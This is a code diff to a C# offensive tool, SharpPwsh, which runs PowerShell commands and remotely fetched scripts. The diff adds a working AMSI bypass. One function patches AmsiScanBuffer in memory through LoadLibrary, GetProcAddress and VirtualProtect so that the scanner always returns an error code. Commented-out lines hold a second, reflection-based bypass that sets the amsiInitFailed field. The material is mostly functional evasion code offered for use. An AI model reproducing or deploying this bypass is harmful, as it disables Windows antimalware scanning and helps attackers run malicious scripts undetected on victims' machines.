@@ -4,6 +4,7 @@ using System.Linq;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Net;
+using System.Runtime.InteropServices;
 using CommandLine;
 
 // need to add as reference:
@@ -19,6 +20,8 @@ namespace SharpPwsh
             public string inputCmd { get; set; }
             [Option('u', "uri", Required = false, HelpText = "URI to fetch remote script")]
             public string inputUri { get; set; }
+            [Option('b', "bypass-amsi", Required = false, HelpText = "Bypass AmSI")]
+            public bool bypassAmsi { get; set; }
         }
         static void Main(string[] args)
         {
@@ -26,7 +29,25 @@ namespace SharpPwsh
             {
                 string inputCmd = o.inputCmd;
                 string inputURI = o.inputUri;
+                bool bypassAmsi = o.bypassAmsi;
                 List<string> cmds = new List<string>();
+
+                //
+                if (bypassAmsi)
+                {
+                    Console.WriteLine("bypassing amsi");
+                    //string bypass = AmsiBypass();
+                    //cmds.Add(bypass);
+                    //cmds.Add("$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \" * iUtils\") {$c=$b}}");
+                    //cmds.Add("$d=$c.GetFields('NonPublic,Static')");
+                    //cmds.Add("Foreach($e in $d) {if ($e.Name -like \" * InitFailed\") {$f=$e}};$f.SetValue($null,$true)");
+                    PatchAmsiScanBuffer();
+                }
+                else
+                {
+                    Console.WriteLine("no bypass");
+                }
+
                 // 
                 if (args.Contains(inputURI))
                 {
@@ -95,7 +116,58 @@ namespace SharpPwsh
 
             rs.Close();
         }
+        public static bool PatchAmsiScanBuffer()
+        {
+            byte[] patch;
+            if (Is64Bit)
+            {
+                patch = new byte[6];
+                patch[0] = 0xB8;
+                patch[1] = 0x57;
+                patch[2] = 0x00;
+                patch[3] = 0x07;
+                patch[4] = 0x80;
+                patch[5] = 0xc3;
+            }
+            else
+            {
+                patch = new byte[8];
+                patch[0] = 0xB8;
+                patch[1] = 0x57;
+                patch[2] = 0x00;
+                patch[3] = 0x07;
+                patch[4] = 0x80;
+                patch[5] = 0xc2;
+                patch[6] = 0x18;
+                patch[7] = 0x00;
+            }
 
+            try
+            {
+                var library = LoadLibrary("amsi.dll");
+                var address = GetProcAddress(library, "AmsiScanBuffer");
+                uint oldProtect;
+                VirtualProtect(address, (UIntPtr)patch.Length, 0x40, out oldProtect);
+                Marshal.Copy(patch, 0, address, patch.Length);
+                VirtualProtect(address, (UIntPtr)patch.Length, oldProtect, out oldProtect);
+                return true;
+            }
+            catch (Exception e)
+            {
+                Console.Error.WriteLine("Exception: " + e.Message);
+                return false;
+            }
+        }
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr LoadLibrary(string name);
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+        [DllImport("kernel32.dll")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        public static bool Is64Bit
+        {
+            get { return IntPtr.Size == 8; }
+        }
         public static string FetchURI(string url)
         {
             try
